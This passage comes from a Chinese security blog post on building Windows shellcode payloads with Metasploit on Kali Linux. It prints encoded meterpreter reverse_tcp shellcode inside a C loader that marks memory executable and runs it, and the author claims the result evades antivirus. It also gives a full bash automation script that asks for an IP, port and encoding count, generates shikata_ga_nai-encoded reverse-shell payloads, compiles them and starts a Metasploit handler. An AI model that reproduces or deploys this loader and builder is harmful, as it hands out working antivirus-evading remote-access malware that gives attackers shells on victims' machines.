class="line">"\xf9\x80\x7f\x1a\x88\x1f\xde\xba\xa7\x09\x17\x25\x1f\x2c\x37"</span><br><span class="line">"\x5d\x53\x6c\x7a\x01\xd2\x99\x69\x5b\x61\x14\x0a\xe1\x2b\xe1"</span><br><span class="line">"\x62\x0c\x07\x9b\x67\xe4\x56\x2f\xf8\xa0\x7e\xdd\xfe\x6d\x0f"</span><br><span class="line">"\xa2\x0e\xfc\x24\xcd\xce\xc0\xa3\x8b\x96\xe5\x1b\x26\xbd\x58"</span><br><span class="line">"\x8d\xcc\x2b\x71\xe4\x37\xda\xb7\xca\x2e\xe1\xe2\x19\xd9\xbf"</span><br><span class="line">"\x29\x5c\xed\x2b\x32\x0f\x9f\x81\x59\xf9\x3b\x31\x57\xe1\x38"</span><br><span class="line">"\x75\x55\xa9\xa8\x30\x8e\xa2\x1e\x9e\x65\xaa\x5f\xe7\x43\xc7"</span><br><span class="line">"\x1e\x06\xc7\x6d\x0f\xb8\x09\xf1\xa7\xaa\x3e\x82\xb0\xf5\x7e"</span><br><span class="line">"\xf6\x08\xe1\x90\xc5\x98\xd0\x11\xe9\x78\xd6\xa6\x44\xf4\x1a"</span><br><span class="line">"\xe9\x7d\x83\xec\x57\xd9\xb5\x80\x0b\x5f\x98\xc8\xec\xeb\x3f"</span><br><span class="line">"\x09\x17\xc8\xad\x8a\x5f\xc6\x6f\x8f\xa3\x11\x7c\x7c\x3e\x25"</span><br><span class="line">"\x44\x62\xbd\xd3\x94\xe8\x0b\x3e\xd9\xbe\x05\x71\x89\x98\x6b"</span><br><span class="line">"\xe3\x4a\x36\x34\x9e\xa6\x90\xee\x69\x13\x16\xa0\x9a\xf5\x68"</span><br><span class="line">"\x53\x22\xdc\x6f\x59\x54\x53\x8a\x25\x31\x40\x3e\x03\x85\xc9"</span><br><span class="line">"\x3b\x1c\xb9\xb1\x6b\xe9\x42\xec\xda\x5f\x24\x8a\x81\x37\x90"</span><br><span class="line">"\xe3\xb0\xe8\xd7\xfe\x8e\xfc\x0b\xc4\xde\x75\x73\x40\x14\x24"</span><br><span class="line">"\x2c\x03\xf0\xfd\x65\x7c\xbf\xe8\xd3\xa2\x80\x16\xd1\x32\x36"</span><br><span class="line">"\x36\x30\x1e\x71\x4f\xe9\x60\x47\x91\xcf\x0c\xf0\xeb\xc3\xe6"</span><br><span class="line">"\xbf\x98\x1a\x3a\x38\xfa\x56\x40\x9e\x4e\x51\xc2\xcb\xc2\x48"</span><br><span class="line">"\xe5\xbf\x0d\xec\xb2\x37\x01\x9f\x7a\xdf\x3a\xde\x30\xe0\x04"</span><br><span class="line">"\xb6\x07\x5e\x5c\x65\x1c\xfd\x24\x02\xbd\x8f\x2c\xba\xdc\xbd"</span><br><span class="line">"\x27\x2a\xe0\x08\x74\xf9\xda\x8b\x4a\xaf\x46\xaf\x67\xd1\x42"</span><br><span class="line">"\x9d\xb5\x11\x70\xd7\x5c\xf0\x36\x1f\x87\x42\x99\xa4\x57\x64"</span><br><span class="line">"\x8f\xf7\xda\x03\x42\x35\x85\x6e\xd5\x6b\xa6\xcd\xdb\x8c\x2f"</span><br><span class="line">"\x37\x62\xef\xfe\x61\xab\xeb\xde\x37\xd8\x5e\x77\x7f\x86\x18"</span><br><span class="line">"\x88\x80\xd4\x02\xe7\x8b";</span><br></pre></td></tr></table></figure>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484635934.jpg" alt="enter description here"></p>
+<h2 id="7-编译、监听、运行"><a href="#7-编译、监听、运行" class="headerlink" title="7.编译、监听、运行"></a>7.编译、监听、运行</h2><p>那么我们得了到了msfvenom生成的shellcode，那么我们将其带入之前弹框的hellword代码中,写出以下代码：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># include &lt;stdlib.h&gt;</span></span><br><span class="line">  # include &lt;stdio.h&gt;</span><br><span class="line">  # include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">  # include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  int</span><br><span class="line">  main(void)</span><br><span class="line">  &#123;</span><br><span class="line">  	char *shellcode =</span><br><span class="line"></span><br><span class="line"><span class="code">    #Shellcode的代码</span></span><br><span class="line">"\xd9\xe1\xbf\xc4\xbd\x41\x38\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"</span><br><span class="line">"\x68\x31\x7e\x19\x83\xee\xfc\x03\x7e\x15\x26\x48\x9a\xec\x1c"</span><br><span class="line">"\x99\x40\x70\xdd\x07\x0e\xae\xe9\xe6\xc6\x67\xa0\x76\x28\x2e"</span><br><span class="line">"\xd8\x7b\x1c\xd4\x5f\x95\x5c\x0a\x80\xed\x24\xaf\x55\xee\xe0"</span><br><span class="line">"\xf9\x80\x7f\x1a\x88\x1f\xde\xba\xa7\x09\x17\x25\x1f\x2c\x37"</span><br><span class="line">"\x5d\x53\x6c\x7a\x01\xd2\x99\x69\x5b\x61\x14\x0a\xe1\x2b\xe1"</span><br><span class="line">"\x62\x0c\x07\x9b\x67\xe4\x56\x2f\xf8\xa0\x7e\xdd\xfe\x6d\x0f"</span><br><span class="line">"\xa2\x0e\xfc\x24\xcd\xce\xc0\xa3\x8b\x96\xe5\x1b\x26\xbd\x58"</span><br><span class="line">"\x8d\xcc\x2b\x71\xe4\x37\xda\xb7\xca\x2e\xe1\xe2\x19\xd9\xbf"</span><br><span class="line">"\x29\x5c\xed\x2b\x32\x0f\x9f\x81\x59\xf9\x3b\x31\x57\xe1\x38"</span><br><span class="line">"\x75\x55\xa9\xa8\x30\x8e\xa2\x1e\x9e\x65\xaa\x5f\xe7\x43\xc7"</span><br><span class="line">"\x1e\x06\xc7\x6d\x0f\xb8\x09\xf1\xa7\xaa\x3e\x82\xb0\xf5\x7e"</span><br><span class="line">"\xf6\x08\xe1\x90\xc5\x98\xd0\x11\xe9\x78\xd6\xa6\x44\xf4\x1a"</span><br><span class="line">"\xe9\x7d\x83\xec\x57\xd9\xb5\x80\x0b\x5f\x98\xc8\xec\xeb\x3f"</span><br><span class="line">"\x09\x17\xc8\xad\x8a\x5f\xc6\x6f\x8f\xa3\x11\x7c\x7c\x3e\x25"</span><br><span class="line">"\x44\x62\xbd\xd3\x94\xe8\x0b\x3e\xd9\xbe\x05\x71\x89\x98\x6b"</span><br><span class="line">"\xe3\x4a\x36\x34\x9e\xa6\x90\xee\x69\x13\x16\xa0\x9a\xf5\x68"</span><br><span class="line">"\x53\x22\xdc\x6f\x59\x54\x53\x8a\x25\x31\x40\x3e\x03\x85\xc9"</span><br><span class="line">"\x3b\x1c\xb9\xb1\x6b\xe9\x42\xec\xda\x5f\x24\x8a\x81\x37\x90"</span><br><span class="line">"\xe3\xb0\xe8\xd7\xfe\x8e\xfc\x0b\xc4\xde\x75\x73\x40\x14\x24"</span><br><span class="line">"\x2c\x03\xf0\xfd\x65\x7c\xbf\xe8\xd3\xa2\x80\x16\xd1\x32\x36"</span><br><span class="line">"\x36\x30\x1e\x71\x4f\xe9\x60\x47\x91\xcf\x0c\xf0\xeb\xc3\xe6"</span><br><span class="line">"\xbf\x98\x1a\x3a\x38\xfa\x56\x40\x9e\x4e\x51\xc2\xcb\xc2\x48"</span><br><span class="line">"\xe5\xbf\x0d\xec\xb2\x37\x01\x9f\x7a\xdf\x3a\xde\x30\xe0\x04"</span><br><span class="line">"\xb6\x07\x5e\x5c\x65\x1c\xfd\x24\x02\xbd\x8f\x2c\xba\xdc\xbd"</span><br><span class="line">"\x27\x2a\xe0\x08\x74\xf9\xda\x8b\x4a\xaf\x46\xaf\x67\xd1\x42"</span><br><span class="line">"\x9d\xb5\x11\x70\xd7\x5c\xf0\x36\x1f\x87\x42\x99\xa4\x57\x64"</span><br><span class="line">"\x8f\xf7\xda\x03\x42\x35\x85\x6e\xd5\x6b\xa6\xcd\xdb\x8c\x2f"</span><br><span class="line">"\x37\x62\xef\xfe\x61\xab\xeb\xde\x37\xd8\x5e\x77\x7f\x86\x18"</span><br><span class="line">"\x88\x80\xd4\x02\xe7\x8b";</span><br><span class="line"></span><br><span class="line">  	DWORD why<span class="emphasis">_must_</span>this_variable;</span><br><span class="line">  	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),</span><br><span class="line">  		PAGE<span class="emphasis">_EXECUTE_</span>READWRITE, &amp;why<span class="emphasis">_must_</span>this_variable);</span><br><span class="line"></span><br><span class="line">  	if (!ret) &#123;</span><br><span class="line">  		printf("VirtualProtect\n");</span><br><span class="line">  		return EXIT_FAILURE;</span><br><span class="line">  	&#125;</span><br><span class="line">  	((void(*)(void))shellcode)();</span><br><span class="line"></span><br><span class="line">  	return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
+<p> 编译可以使用vs微软的编译器也可以和我一样使用tdm-gcc。<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> TDM-GCC是Windows的编译器套件。</span><br><span class="line">它结合了最新的GCC工具集的稳定版本， Windows友好的几个补丁程序，以及免费和开源的 MinGW或 MinGW-w64运行时API，以创建Microsoft的编译器和平台SDK的开源替代软件。</span><br><span class="line">它可以创建32位OR 64位二进制文​​件，适用于任何Windows版本的Windows 98。</span><br><span class="line">它具有易于使用的单文件安装程序，只需点击几下即可创建工作安装，并可在新软件包可用时更新该安装。</span><br><span class="line">它仅由命令行工具组成。如果您想要一个可视化IDE（文本编辑器，编译器接口，可视化调试器）， Code :: Blocks与TDM-GCC集成很好。</span><br></pre></td></tr></table></figure></p>
+<p> 关于TDM-GCC在我的项目中有提到过 <a href="https://github.com/demonsec666/secist_script" target="_blank" rel="noopener">https://github.com/demonsec666/secist_script</a></p>
+<p>1.使用TDM-GCC 虽然有报错 ，但是也不影响最终得到会话的结果<br>2.其中的-M32 代表指的是32位 以及-W -Wall 是忽略警告的意思，其他的我就不用多说了吧<br>3.也可以使用vs进行编译生成exe。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485668396.jpg" alt="enter description here"></p>
+<p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485903488.jpg" alt="enter description here"></p>
+<p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485863927.jpg" alt="enter description here"></p>
+<p> 以下是我在win下编译运行测试得到的结果，也是同样绕过杀软的安全防护</p>
+<p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CACE2616E540CCD26C7E328C258F10AA.png" alt="enter description here"></p>
+<h2 id="8-Bash下的编写思路形成懒人自动化的脚本"><a href="#8-Bash下的编写思路形成懒人自动化的脚本" class="headerlink" title="8.Bash下的编写思路形成懒人自动化的脚本"></a>8.Bash下的编写思路形成懒人自动化的脚本</h2><p>我们要考虑几点内容：<br>1.如何将我们生成的shellcode代码代入到cpp当中<br>2.如何指定ip和端口 自动化的帮我们完成所有事情</p>
+<p> 1.如何将我们生成的shellcode代码代入到cpp当中<br> 其实我们可以使用echo大法使用重定向到缓存文件中，echo 可以使用变量符合$ 将里面的命令括起来 将其输出的内容写入到缓存文件中期<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505486902561.jpg" alt="enter description here"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  LHOST</span><br><span class="line">=192.168.1.100 LPORTta<span class="emphasis">_ga_</span>nai -b '\x00' -i 4 -f c) &gt;&gt;  shellcode.txt</span><br></pre></td></tr></table></figure>
+<p>2.写到缓存文件我们是不是马上可以放入到cpp中去呢？其实不是 细心的朋友可以发现shellcode.txt中包含着 unsigned char buf[] = 的字符串。</p>
+<p>所以我们需要用的一个命令 =&gt;  sed ,使用sed 删除匹配unsigned char buf[] = 的字符串<br>也就是说得到以下命令<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed 's/unsigned char buf\[\] =//g'</span><br></pre></td></tr></table></figure></p>
+<p> 以及完整的命令就是<br> <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  LHOST</span><br><span class="line">=192.168.1.100 LPORTta<span class="emphasis">_ga_</span>nai -b '\x00' -i 4 -f c)  | sed 's/unsigned char buf\[\] =//g' &gt;&gt;  </span><br><span class="line">shellcode.txt</span><br></pre></td></tr></table></figure></p>
+<p> 第一个问题解决了 讲msfvenom的shellcode存储到缓存文件中 ，那么我们需要得到完整的cpp文件该如何做呢，<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">echo $(msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  LHOST</span><br><span class="line"> =192.168.1.100 LPORTta<span class="emphasis">_ga_</span>nai -b '\x00' -i 4 -f c)  | sed 's/unsigned char buf\[\] =//g' &gt;&gt;  </span><br><span class="line"> shellcode.txt</span><br><span class="line"> echo  "</span><br><span class="line"> # include &lt;stdlib.h&gt;</span><br><span class="line"> # include &lt;stdio.h&gt;</span><br><span class="line"> # include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"> # include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> int</span><br><span class="line"> main(void)</span><br><span class="line"> &#123;</span><br><span class="line"> 	char *shellcode =</span><br><span class="line"></span><br><span class="line">   $Shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 	DWORD why<span class="emphasis">_must_</span>this_variable;</span><br><span class="line"> 	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),</span><br><span class="line"> 		PAGE<span class="emphasis">_EXECUTE_</span>READWRITE, &amp;why<span class="emphasis">_must_</span>this_variable);</span><br><span class="line"></span><br><span class="line"> 	if (!ret) &#123;</span><br><span class="line"> 		printf(\"VirtualProtect\n\");</span><br><span class="line"> 		return EXIT_FAILURE;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	((void(*)(void))shellcode)();</span><br><span class="line"></span><br><span class="line"> 	return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> " &gt;&gt; output/shellcode.cpp</span><br></pre></td></tr></table></figure></p>
+<p> 我们将得到的shellcode.txt 使用cat命令 将它输出 并且存储在一个变量中，如我使用的变量$shellcode，并将其变量代入到c代码中去这样也就完整的输出成我们想要的编译文件。</p>
+<p> 2.如何指定ip和端口 自动化的帮我们完成所有事情<br> 在bash编程中我们使用read语法 ，read 就是接受用户键入的字符串。<br> 那么我们可以将其写成这样的：<br>   <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> echo -e "       secist&gt;请输入你的ip地址: \c"</span><br><span class="line">read ip</span><br><span class="line">echo -e "       secist&gt;请输入你的端口: \c"</span><br><span class="line">read port</span><br><span class="line">echo -e "       secist&gt;编码次数(1-500): \c"</span><br><span class="line">read encode</span><br></pre></td></tr></table></figure></p>
+<p> 分别将ip地址、端口、编码迭代次数。存储到ip、port、encode变量中。</p>
+<h2 id="9-开启上帝视角"><a href="#9-开启上帝视角" class="headerlink" title="9.开启上帝视角"></a>9.开启上帝视角</h2><p> 最终我的个人完整代码为：</p>
+<pre><code class="markdown">shellcode (){
+clear
+
+echo  -e "         &lt; Shellcode Payload &gt;"
+echo  -e "          --------------------"
+echo -e "                             \   ^__^             "
+echo -e "                              \  (oo)\<span class="strong">_____</span>__     "
+echo -e "                                 (__)\       )\/\ "
+echo -e "                                     ||----w |    "
+echo -e "                                     ||     ||     "
+echo "  "
+echo -e "  +------------++-------------------------++-----------------------+"
+echo      "             即刻安全周年庆版v1.7 (secist----2017.7.14)"
+echo " "
+echo -e "            你的IP地址 :\c"
+/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
+echo "            系统版本 :$(cat /etc/issue)"
+echo -e "  +------------++-------------------------++-----------------------+"
+echo "  "
+echo "        [1] Meterpreter<span class="emphasis">_Reverse_</span>tcp         [5] Shell<span class="emphasis">_reverse_</span>tcp"
+echo "        [2] Meterpreter<span class="emphasis">_Reverse_</span>http             [6] exit"
+echo "        [3] Meterpreter<span class="emphasis">_Reverse_</span>https         "
+echo "        [4] Meterpreter<span class="emphasis">_Reverse_</span>tcp_dns          "
+echo "        [7] back meun     "
+echo ""
+echo -e "              secist&gt; \c"
+read option
+
+<span class="section">#Aukeratu</span>
+case $option in
+1)
+payload='windows/meterpreter/reverse_tcp'
+;;
+2)
+payload='windows/meterpreter/reverse_http'
+;;
+3)
+payload='windows/meterpreter/reverse_https'
+;;
+4)
+payload='windows/meterpreter/reverse<span class="emphasis">_tcp_</span>dns'
+;;
+5)
+payload='windows/shell/reverse_tcp'
+;;
+6)
+exit
+;;
+7)
+menu
+;;
+*)
+shellcode
+;;
+esac
+if [ "$option" == "1" ]; then
+  shellcode1
+elif [ "$option" == "2" ]; then
+  shellcode1
+elif [ "$option" == "3" ]; then
+  shellcode1
+
+elif [ "$option" == "4" ]; then
+  shellcode1
+
+elif [ "$option" == "5" ]; then
+  shellcode1
+
+ elif [ "$option" == "6" ]; then
+<span class="code">    exit</span>
+
+ elif [ "$option" == "7" ]; then
+<span class="code">    menu</span>
+  fi
+}
+
+shellcode1(){
+<span class="section">#定义了一个菜单为shellcode1</span>
+  echo -e "       secist&gt;请输入你的ip地址: \c"
+  read ip
+  echo -e "       secist&gt;请输入你的端口: \c"
+  read port
+  echo -e "       secist&gt;编码次数(1-500): \c"
+  read encode
+  echo  $( msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse<span class="emphasis">_tcp LHOST=$ip  LPORT=$port -e x86/shikata_</span>ga_nai -b '\x00' -i $encode -f c) | sed 's/unsigned char buf\[\] =//g' &gt;&gt; output/shellcode.txt
+  Shellcode=$(cat output/shellcode.txt)
+  echo  "
+  # include &lt;stdlib.h&gt;
+  # include &lt;stdio.h&gt;
+  # include &lt;string.h&gt;
+
+  # include &lt;windows.h&gt;
+
+
+  int
+  main(void)
+  {
+<span class="code">      char *shellcode =</span>
+
+<span class="code">    $Shellcode</span>
+
+
+<span class="code">      DWORD why_must_this_variable;</span>
+<span class="code">      BOOL ret = VirtualProtect(shellcode, strlen(shellcode),</span>
+<span class="code">          PAGE_EXECUTE_READWRITE, &amp;why_must_this_variable);</span>
+
+<span class="code">      if (!ret) {</span>
+<span class="code">          printf(\"VirtualProtect\n\");</span>
+<span class="code">          return EXIT_FAILURE;</span>
+<span class="code">      }</span>
+<span class="code">      ((void(*)(void))shellcode)();</span>
+
+<span class="code">      return 0;</span>
+  }
+
+  " &gt;&gt; output/shellcode.cpp
+
+  wine gcc -m32 -W -Wall -o output/shellcode.exe output/shellcode.cpp
+  rm output/shellcode.txt output/shellcode.cpp
+  echo -e "  +------------++-------------------------++-----------------------+"
+  echo -e "  | Name       ||  Descript                 || Your Input             "
+  echo -e "  +------------++-------------------------++-----------------------+"
+  echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+  echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+  echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+  echo -e "  +------------++-------------------------++-----------------------+"
+  echo "use exploit/multi/handler" &gt;&gt; resource/handler.rc
+  echo "set PAYLOAD $payload" &gt;&gt; resource/handler.rc
+  echo "set LHOST $ip" &gt;&gt;  resource/handler.rc
+  echo "set LPORT $port" &gt;&gt;  resource/handler.rc
+  echo "exploit " &gt;&gt;  resource/handler.rc
+  msfconsole -r  resource/handler.rc
+}
+</code></pre>
+<h2 id="关注一下"><a href="#关注一下" class="headerlink" title="关注一下"></a>关注一下</h2><p> 我已在GitHub中上传了相关脚本文件 各位可以自行下载和点个星关注下我们即刻安全<br> <a href="https://github.com/demonsec666/secist_script" target="_blank" rel="noopener">https://github.com/demonsec666/secist_script</a></p>
+<p> 欢迎加入即刻安全技术群，与我一起讨论 。群号:307283889</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag">#Metasploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/DKMC.html" rel="prev">DKMC | bmp | Msf | kali linux 2017</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/pastezort.html" rel="next">Pastezort|MSF|Powershell |kali linux 2017</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="secist-shellcode.html" data-title="我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017" data-url="www.ggsec.cn/secist-shellcode.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">156</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
